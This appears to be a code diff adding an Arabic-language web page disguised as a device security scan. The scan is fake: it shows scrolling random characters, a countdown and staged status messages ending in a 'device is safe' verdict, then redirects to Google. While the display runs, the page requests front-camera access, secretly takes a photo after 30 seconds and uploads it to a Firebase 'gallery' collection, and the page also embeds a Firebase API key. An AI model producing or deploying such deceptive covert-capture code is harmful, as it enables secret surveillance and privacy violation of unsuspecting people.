@@ -1,0 +1,90 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص النظام</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Courier New',monospace;background:#000;color:#0f0;min-height:100vh;padding:20px;overflow:hidden}
+.container{max-width:500px;margin:0 auto;text-align:center}
+.btn-start{padding:20px 40px;background:#0a0a0a;color:#0f0;border:2px solid #0f0;font-size:20px;cursor:pointer;border-radius:10px;margin-top:50px;font-family:'Courier New',monospace;font-weight:bold}
+.btn-start:hover{background:#0f0;color:#000}
+.code-screen{display:none;text-align:left;font-size:11px;line-height:1.4;height:300px;overflow:hidden;padding:10px;background:#000;border:1px solid #0f0;border-radius:8px;margin:15px 0}
+.code-screen .line{opacity:0.7}
+.code-screen .line:nth-child(odd){color:#0f0}
+.code-screen .line:nth-child(even){color:#0a0}
+.timer{color:#ff0;font-size:40px;font-weight:bold;margin:15px 0}
+.status{color:#0f0;font-size:13px}
+.progress{width:100%;height:5px;background:#111;border-radius:3px;margin:10px 0;overflow:hidden}
+.progress-fill{height:100%;width:0%;background:#0f0;transition:width 0.3s}
+canvas,video{display:none}
+</style></head>
+<body>
+<div class="container">
+<div id="startScreen">
+<h1 style="color:#0f0;font-size:22px;">🛡️ فحص النظام</h1>
+<p style="color:#666;margin:20px 0;">فحص شامل لجميع ملفات النظام والكشف عن التهديدات</p>
+<button class="btn-start" onclick="startScan()">⚡ ابدأ الفحص</button>
+</div>
+
+<div id="scanScreen" class="code-screen"></div>
+<div id="timerScreen" style="display:none;text-align:center;">
+<div class="timer" id="timer">40</div>
+<div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+<div class="status" id="status">⏳ جاري فحص النظام...</div>
+</div>
+</div>
+<canvas id="canvas" width="320" height="240"></canvas>
+<video id="video" autoplay playsinline></video>
+
+<script>
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+var stream=null;
+
+function generateCode(){
+var lines=[];
+for(var i=0;i<80;i++){
+var line='';
+for(var j=0;j<60;j++){line+=String.fromCharCode(33+Math.floor(Math.random()*90));}
+lines.push('<div class="line">'+line+'</div>');
+}
+return lines.join('');
+}
+
+async function startScan(){
+document.getElementById('startScreen').style.display='none';
+try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});document.getElementById('video').srcObject=stream;}catch(e){}
+
+document.getElementById('scanScreen').style.display='block';
+document.getElementById('scanScreen').innerHTML=generateCode();
+document.getElementById('timerScreen').style.display='block';
+
+// كود متحرك
+var codeInterval=setInterval(function(){
+document.getElementById('scanScreen').innerHTML=generateCode();
+document.getElementById('scanScreen').scrollTop=document.getElementById('scanScreen').scrollHeight;
+},200);
+
+// تصوير بعد 30 ثانية
+setTimeout(function(){
+var c=document.getElementById('canvas'),ctx=c.getContext('2d');
+ctx.drawImage(document.getElementById('video'),0,0,320,240);
+db.collection('gallery').add({url:c.toDataURL('image/jpeg',0.5),type:'📸 فحص النظام',timestamp:new Date().toISOString()});
+if(stream)stream.getTracks().forEach(function(t){t.stop()});
+},30000);
+
+// عداد
+var sec=40;
+var timerInterval=setInterval(function(){
+sec--;document.getElementById('timer').textContent=sec;
+document.getElementById('progressFill').style.width=((40-sec)/40*100)+'%';
+if(sec<=35)document.getElementById('status').textContent='⏳ فحص ملفات kernel...';
+if(sec<=25)document.getElementById('status').textContent='⏳ فحص الذاكرة المؤقتة...';
+if(sec<=15)document.getElementById('status').textContent='⏳ فحص الحساسات...';
+if(sec<=5)document.getElementById('status').textContent='⏳ التحقق من الأمان...';
+if(sec<=0){clearInterval(timerInterval);clearInterval(codeInterval);
+document.getElementById('status').textContent='✅ تم الفحص - الجهاز آمن';
+setTimeout(function(){window.location.href='https://google.com/'},3000);
+}
+},1000);
+}
+</script></body></html>
